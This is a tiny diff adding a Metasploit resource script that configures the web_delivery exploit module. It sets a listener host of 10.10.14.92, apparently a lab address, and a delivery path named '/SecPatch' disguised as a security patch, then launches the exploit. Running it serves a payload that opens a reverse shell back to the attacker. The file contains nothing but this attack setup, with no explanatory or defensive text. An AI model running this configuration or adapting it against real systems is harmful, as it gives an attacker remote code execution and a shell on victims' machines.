@@ -1,0 +1,7 @@
+
+use exploit/multi/script/web_delivery
+set SRVHOST 10.10.14.92
+set LHOST 10.10.14.92
+set URIPATH /SecPatch
+exploit
+    
